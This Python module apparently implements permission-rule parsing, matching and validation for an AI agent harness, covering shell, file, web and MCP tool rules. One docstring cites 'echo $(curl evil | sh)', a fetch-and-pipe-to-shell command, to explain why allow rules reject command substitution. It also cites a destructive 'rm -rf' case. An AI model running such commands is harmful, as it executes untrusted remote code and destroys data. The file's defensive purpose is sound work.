"""Permission rule parsing, matching and validation (WP3).

Implements spec 04 §2.3 (syntax: ``Tool``, ``Tool(content)``, ``Tool()``/``Tool(*)``
= whole tool, ``\\(``/``\\)`` literal parens, CLI lists split on comma/whitespace
outside parens), 04 R7 + §4.2 (Bash prefix ``cmd:*`` / wildcard / exact;
``"git *"`` also matches bare ``git``), 04 R8 (validator warnings), 04 R9
(gitignore-style file patterns for Read/Write/Edit/Glob/NotebookEdit; WebFetch
``domain:<host>``; WebSearch no wildcards), 04 R10 / 07 R17 (MCP rules:
``mcp__srv``, ``mcp__srv__*``, ``mcp__srv__tool``; allow-rule wildcards only after
the literal server prefix; content patterns rejected), settings loading
(``permissions.allow/ask/deny`` with their ``RuleSource``).

For compound shell commands each subcommand is matched separately; an allow
rule must cover every subcommand (04 §4.2 last paragraph) - that combination is
done in ``bash_safety.check_bash``.

The same matcher (``rule_matches_call``) backs hook ``if`` filters (04 R32), and
``Agent(<type>)`` rules compare agent types case- and format-insensitively
(06 R6).
"""

from __future__ import annotations

import fnmatch
import os
import re
from typing import Any, Iterable, Literal
from urllib.parse import urlparse

from harnesslab.config import Settings, SettingsSource
from harnesslab.permissions.types import Rule, RuleBehavior, RuleSource
from harnesslab.tools.base import Tool

FILE_PATTERN_TOOLS = frozenset({"Read", "Write", "Edit", "Glob", "NotebookRead", "NotebookEdit", "Cd"})

#: Shell tools whose rule content is a command line (04 §4.2).
SHELL_TOOLS = frozenset({"Bash", "PowerShell"})

#: Tools whose rule content names a subagent type (06 R6: ``Agent(<type>)``).
AGENT_TOOLS = frozenset({"Agent", "Task"})

#: Which input field a content rule is compared against, by tool name. Used when
#: only a tool *name* is known (hook ``if`` filters, 04 R32). Tools passed as
#: objects use their ``rule_content_field`` first.
CONTENT_FIELD_BY_NAME: dict[str, str] = {
    "Bash": "command",
    "PowerShell": "command",
    "Read": "file_path",
    "Write": "file_path",
    "Edit": "file_path",
    "NotebookRead": "notebook_path",
    "NotebookEdit": "notebook_path",
    "Glob": "path",
    "Cd": "path",
    "WebFetch": "url",
    "WebSearch": "query",
    "Agent": "subagent_type",
    "Task": "subagent_type",
    "Skill": "skill",
}


class RuleSyntaxError(ValueError):
    pass


# ------------------------------------------------------------------ parsing


def _find_unescaped(text: str, ch: str, start: int = 0) -> int:
    """Index of the first ``ch`` not preceded by a backslash escape, or -1."""
    i = start
    while i < len(text):
        c = text[i]
        if c == "\\":
            i += 2
            continue
        if c == ch:
            return i
        i += 1
    return -1


def _unescape_parens(content: str) -> str:
    return content.replace("\\(", "(").replace("\\)", ")")


def parse_rule(text: str, behavior: RuleBehavior = "allow", source: RuleSource = RuleSource.SESSION) -> Rule:
    """Parse ``Tool`` / ``Tool(content)`` (04 §2.3, §4.2 ``parse_rule``).

    * ``Tool()`` and ``Tool(*)`` normalise to the whole-tool rule (``content=None``).
    * ``\\(`` and ``\\)`` inside the content are literal parentheses.
    * The content must end at the *last* character: ``Bash(ls) extra`` is an error.
    """
    raw = text.strip()
    if not raw:
        raise RuleSyntaxError("empty rule")
    open_i = _find_unescaped(raw, "(")
    if open_i < 0:
        if _find_unescaped(raw, ")") >= 0:
            raise RuleSyntaxError(f"unbalanced ')' in rule {text!r}")
        name, content = raw, None
    else:
        if not raw.endswith(")") or raw.endswith("\\)") and not raw.endswith("\\\\)"):
            raise RuleSyntaxError(f"rule {text!r} must end with ')'")
        name, content = raw[:open_i].strip(), _unescape_parens(raw[open_i + 1 : -1])
    if not name or re.search(r"\s", name):
        raise RuleSyntaxError(f"invalid tool name in rule {text!r}")
    if content is not None and content.strip() in ("", "*"):
        content = None
    return Rule(name, content, behavior, source)


def split_rule_list(cli_value: str) -> list[str]:
    """Split a CLI rule list on commas / whitespace that sit *outside* parentheses
    (04 §2.3), so ``"Bash(git log, git diff) Read"`` gives two rules."""
    out: list[str] = []
    cur: list[str] = []
    depth = 0
    i = 0
    while i < len(cli_value):
        c = cli_value[i]
        if c == "\\" and i + 1 < len(cli_value):
            cur.append(cli_value[i : i + 2])
            i += 2
            continue
        if c == "(":
            depth += 1
        elif c == ")":
            depth = max(0, depth - 1)
        if depth == 0 and (c == "," or c.isspace()):
            if cur:
                out.append("".join(cur))
                cur = []
        else:
            cur.append(c)
        i += 1
    if cur:
        out.append("".join(cur))
    return out


# ------------------------------------------------------------------ shell rules


def _has_unescaped_star(content: str) -> bool:
    return _find_unescaped(content, "*") >= 0


def bash_rule_kind(content: str) -> Literal["prefix", "wildcard", "exact"]:
    """``cmd:*`` = prefix, any other unescaped ``*`` = wildcard, else exact (04 R7)."""
    if content.endswith(":*"):
        return "prefix"
    if _has_unescaped_star(content):
        return "wildcard"
    return "exact"


def _wildcard_regex(body: str) -> str:
    """Translate a shell-rule wildcard body to a regex: ``*`` = anything,
    ``\\*`` = a literal star, everything else literal."""
    rx: list[str] = []
    i = 0
    while i < len(body):
        c = body[i]
        if c == "\\" and i + 1 < len(body):
            rx.append(re.escape(body[i + 1]))
            i += 2
            continue
        rx.append(".*" if c == "*" else re.escape(c))
        i += 1
    return "".join(rx)


def bash_rule_matches(rule: Rule, command: str) -> bool:
    """Match one shell rule against one (sub)command string (04 §4.2).

    * prefix ``git status:*`` matches ``git status`` and ``git status -s`` but
      not ``git statusx``;
    * wildcard ``npm run *`` - a single trailing `` *`` also matches the bare
      command (``git *`` matches ``git``);
    * exact compares the whole string.
    A whole-tool rule (``content is None``) matches every command.
    """
    if rule.content is None:
        return True
    cmd = command.strip()
    content = rule.content.strip()
    kind = bash_rule_kind(content)
    if kind == "prefix":
        p = content[:-2].rstrip()
        return cmd == p or cmd.startswith(p + " ")
    if kind == "wildcard":
        body = content
        stars = [i for i, c in enumerate(body) if c == "*" and (i == 0 or body[i - 1] != "\\")]
        trailing_any = body.endswith(" *") and len(stars) == 1
        if trailing_any:
            body = body[:-2]
        rx = _wildcard_regex(body)
        if trailing_any:
            rx += "(?: .*)?"
        return re.fullmatch(rx, cmd, flags=re.DOTALL) is not None
    return cmd == content.replace("\\*", "*")  # exact; an escaped star is a literal star


# ------------------------------------------------------------------ file rules


def _glob_to_regex(pattern: str) -> str:
    """gitignore-flavoured glob -> regex: ``**/`` any directories (or none),
    ``**`` anything, ``*`` within one segment, ``?`` one non-slash char."""
    rx: list[str] = []
    i = 0
    while i < len(pattern):
        if pattern.startswith("**/", i):
            rx.append("(?:.*/)?")
            i += 3
        elif pattern.startswith("**", i):
            rx.append(".*")
            i += 2
        elif pattern[i] == "*":
            rx.append("[^/]*")
            i += 1
        elif pattern[i] == "?":
            rx.append("[^/]")
            i += 1
        else:
            rx.append(re.escape(pattern[i]))
            i += 1
    return "".join(rx)


def file_rule_matches(rule: Rule, path: str, *, base: str) -> bool:
    """gitignore-style glob (``**``, ``*``, ``?``, leading ``/`` anchors to ``base``,
    ``~`` expands to home).

    Anchoring (04 R9, design choice where the spec is silent):

    * ``//abs/path`` - absolute filesystem path;
    * ``~/x``        - relative to the home directory;
    * ``/x`` or ``./x`` or any pattern containing a ``/`` - relative to ``base``
      (the directory the rule belongs to; we use the session cwd);
    * a bare name such as ``*.env`` - matches at any depth under ``base``.

    A pattern naming a directory also covers everything inside it, as in
    gitignore (``Edit(src)`` covers ``src/a.py``).
    """
    if rule.content is None:
        return True
    pat = rule.content.strip()
    if pat.startswith("//"):
        anchored = pat[1:]
    elif pat.startswith("~"):
        anchored = os.path.expanduser(pat)
    elif pat.startswith("/"):
        anchored = base.rstrip("/") + pat
    elif pat.startswith("./"):
        anchored = base.rstrip("/") + pat[1:]
    elif "/" in pat.rstrip("/"):
        anchored = base.rstrip("/") + "/" + pat
    else:
        anchored = base.rstrip("/") + "/**/" + pat
    anchored = anchored.rstrip("/") or "/"
    full = os.path.normpath(os.path.join(base, os.path.expanduser(path)))
    rx = _glob_to_regex(anchored) + "(?:/.*)?"
    return re.fullmatch(rx, full, flags=re.DOTALL) is not None


# ------------------------------------------------------------------ web / mcp


def webfetch_rule_matches(rule: Rule, url: str) -> bool:
    """``WebFetch(domain:example.com)`` matches URLs whose host is exactly that
    domain (case-insensitive). Other content forms never match (04 R9)."""
    if rule.content is None:
        return True
    c = rule.content.strip()
    if not c.startswith("domain:"):
        return False
    host = (urlparse(url if "://" in url else "https://" + url).hostname or "").lower().rstrip(".")
    return host == c[len("domain:") :].strip().lower().rstrip(".")


def mcp_server_of(tool_name: str) -> str | None:
    """``mcp__github__create_issue`` -> ``github``; non-MCP names -> ``None``."""
    if not tool_name.startswith("mcp__"):
        return None
    rest = tool_name[len("mcp__") :]
    return rest.split("__", 1)[0] or None


def mcp_rule_matches(rule: Rule, tool_name: str) -> bool:
    """MCP rules (04 R10, 07 R17): ``mcp__srv`` names the whole server,
    ``mcp__srv__*`` / ``mcp__srv__tool`` match by glob. Content patterns are not
    allowed on MCP rules, so a rule with content never matches."""
    if rule.content is not None or not rule.tool_name.startswith("mcp__"):
        return False
    server = mcp_server_of(tool_name)
    if server is not None and rule.tool_name == f"mcp__{server}":
        return True
    return fnmatch.fnmatchcase(tool_name, rule.tool_name)


# ------------------------------------------------------------------ dispatch


def _norm_agent_type(name: str) -> str:
    """Case- and format-insensitive agent type (06 R6): ``Code_Reviewer`` ==
    ``code-reviewer``."""
    return re.sub(r"[\s_\-]+", "", name).lower()


def _content_value(tool_name: str, field_name: str | None, input: dict[str, Any]) -> str | None:
    key = field_name or CONTENT_FIELD_BY_NAME.get(tool_name)
    if key is None:
        return None
    v = input.get(key)
    if v is None and key == "file_path":
        v = input.get("path") or input.get("notebook_path")
    return v if isinstance(v, str) else None


def rule_names_tool(rule: Rule, tool_name: str, aliases: Iterable[str] = ()) -> bool:
    """Does the rule's tool part name this tool (directly, by alias, or as an MCP
    server/family)?"""
    if rule.tool_name == tool_name or rule.tool_name in aliases:
        return True
    if rule.tool_name.startswith("mcp__") and tool_name.startswith("mcp__"):
        return mcp_rule_matches(Rule(rule.tool_name, None, rule.behavior, rule.source), tool_name)
    return False


def rule_matches_call(
    rule: Rule,
    tool_name: str,
    input: dict[str, Any],
    *,
    cwd: str,
    aliases: Iterable[str] = (),
    content_field: str | None = None,
) -> bool:
    """The single matcher shared by permission rules and hook ``if`` filters
    (04 R32): tool part first, then content by tool kind.

    Shell content rules use ``match_shell_content`` (compound-aware, see there).
    """
    if not rule_names_tool(rule, tool_name, aliases):
        return False
    if rule.content is None:
        return True
    if tool_name.startswith("mcp__"):
        return False  # 07 R17: MCP rules take no content
    base_name = rule.tool_name if rule.tool_name in CONTENT_FIELD_BY_NAME else tool_name
    value = _content_value(base_name, content_field, input)
    if value is None:
        return False
    if base_name in SHELL_TOOLS:
        return match_shell_content(rule, value)
    if base_name in FILE_PATTERN_TOOLS:
        return file_rule_matches(rule, value, base=cwd)
    if base_name == "WebFetch":
        return webfetch_rule_matches(rule, value)
    if base_name in AGENT_TOOLS:
        return _norm_agent_type(value) in {_norm_agent_type(x) for x in rule.content.split(",")}
    return value == rule.content


def match_shell_content(rule: Rule, command: str) -> bool:
    """Compound-aware shell rule matching (04 §4.2 last paragraph).

    * ``deny`` / ``ask`` rules match when the whole command *or any* subcommand
      matches - ``ls && rm -rf x`` is caught by ``Bash(rm:*)``. Leading
      environment assignments are ignored for this (``FOO=1 rm x`` is still rm).
    * ``allow`` rules must cover *every* subcommand, and never match a command
      containing command/process substitution (its real arguments are unknown):
      ``Bash(echo:*)`` must not approve ``echo $(curl evil | sh)``. Only an
      *exact* rule may approve such a command, because the user approved that
      literal string.
    Combining several allow rules (``git add`` covered by one rule, ``git
    commit`` by another) happens in ``bash_safety.check_bash``.
    """
    from harnesslab.permissions.bash_safety import parse_shell

    if bash_rule_matches(rule, command):
        if rule.behavior != "allow":
            return True
        kind = bash_rule_kind(rule.content or "")
        if kind == "exact" or rule.content is None:
            return True
    ast = parse_shell(command)
    if ast.kind != "ok":
        return False
    if rule.behavior == "allow":
        if ast.has_command_substitution or ast.has_process_substitution:
            return False
        return bool(ast.commands) and all(bash_rule_matches(rule, c.rule_text(strip_env=False)) for c in ast.commands)
    return any(
        bash_rule_matches(rule, c.rule_text(strip_env=False)) or bash_rule_matches(rule, c.rule_text(strip_env=True))
        for c in ast.commands
    )


def matches_whole_tool(rule: Rule, tool: Tool) -> bool:
    """Whole-tool rule naming ``tool.name`` (or an alias, or an MCP server/family)."""
    return rule.content is None and rule_names_tool(rule, tool.name, tool.aliases)


def matches_content(rule: Rule, tool: Tool, input: dict[str, Any], *, cwd: str) -> bool:
    """Content rule dispatch by tool kind (Bash / file / WebFetch / generic exact)."""
    if rule.content is None:
        return False
    return rule_matches_call(
        rule, tool.name, input, cwd=cwd, aliases=tool.aliases, content_field=tool.rule_content_field
    )


def matches(rule: Rule, tool: Tool, input: dict[str, Any], *, cwd: str) -> bool:
    """Whole-tool or content match."""
    return matches_whole_tool(rule, tool) or matches_content(rule, tool, input, cwd=cwd)


def first_match(rules: Iterable[Rule], tool: Tool, input: dict[str, Any], *, cwd: str, whole_only: bool = False, content_only: bool = False) -> Rule | None:
    for r in rules:
        if whole_only and matches_whole_tool(r, tool):
            return r
        if content_only and matches_content(r, tool, input, cwd=cwd):
            return r
        if not whole_only and not content_only and matches(r, tool, input, cwd=cwd):
            return r
    return None


# ------------------------------------------------------------------ validation


def validate_rule(rule: Rule) -> list[str]:
    """04 R8 / R10 warnings (empty list = fine)."""
    warnings: list[str] = []
    name, content = rule.tool_name, rule.content
    if name in ("Write", "Glob") and content is not None:
        warnings.append(
            f"{rule}: file permission checks consult only Edit and Read rules; use Edit(...) or Read(...) instead."
        )
    if name in SHELL_TOOLS and content is not None:
        if content.endswith(":*") and _has_unescaped_star(content[:-2]):
            warnings.append(f"{rule}: mixes '*' wildcards with a trailing ':*' prefix marker; pick one form.")
        words = content.split()
        if len(words) >= 2 and words[1] == "*" and len(words) > 2:
            warnings.append(
                f"{rule}: a wildcard before the subcommand also matches injected options "
                f"(for git, options like -c can execute code)."
            )
        elif len(words) >= 2 and "*" in words[1] and not words[1].startswith("-") and len(words) > 2:
            warnings.append(f"{rule}: a wildcard in the subcommand position also matches injected options.")
    if name == "WebFetch" and content is not None and not content.startswith("domain:"):
        warnings.append(f"{rule}: WebFetch rules must use the form WebFetch(domain:<host>).")
    if name == "WebSearch" and content is not None and "*" in content:
        warnings.append(f"{rule}: WebSearch rules cannot contain wildcards.")
    if name.startswith("mcp__"):
        if content is not None:
            warnings.append(f"{rule}: MCP rules do not take a content pattern; use mcp__server or mcp__server__tool.")
        rest = name[len("mcp__") :]
        server, _, tool_part = rest.partition("__")
        if rule.behavior == "allow" and any(ch in server for ch in "*?["):
            warnings.append(f"{rule}: allow rules may use a wildcard only after a literal mcp__<server>__ prefix.")
        elif rule.behavior == "allow" and "*" in tool_part and not tool_part.endswith("*"):
            pass  # literal prefix + wildcard tool part is fine
        if not server:
            warnings.append(f"{rule}: missing MCP server name.")
    return warnings


def rule_is_loadable(rule: Rule) -> bool:
    """Hard rejections (as opposed to warnings): MCP rules with content (07 R17)
    and MCP allow rules with a wildcard before the literal server prefix (04 R10)."""
    if not rule.tool_name.startswith("mcp__"):
        return True
    if rule.content is not None:
        return False
    server = rule.tool_name[len("mcp__") :].partition("__")[0]
    return not (rule.behavior == "allow" and any(ch in server for ch in "*?["))


def rules_from_settings(settings: Settings) -> list[Rule]:
    """Aggregate ``permissions.{allow,ask,deny}`` from every settings layer with its source.

    Invalid entries (syntax errors, MCP rules failing 07 R17 / 04 R10) are skipped;
    use ``validate_rule`` to surface warnings to the user.
    """
    out: list[Rule] = []
    for src in SettingsSource:
        for behavior in ("deny", "ask", "allow"):
            entries = settings.get_from(src, f"permissions.{behavior}", []) or []
            for text in entries:
                if not isinstance(text, str):
                    continue
                try:
                    rule = parse_rule(text, behavior, RuleSource(src.value))  # type: ignore[arg-type]
                except RuleSyntaxError:
                    continue
                if rule_is_loadable(rule):
                    out.append(rule)
    return out
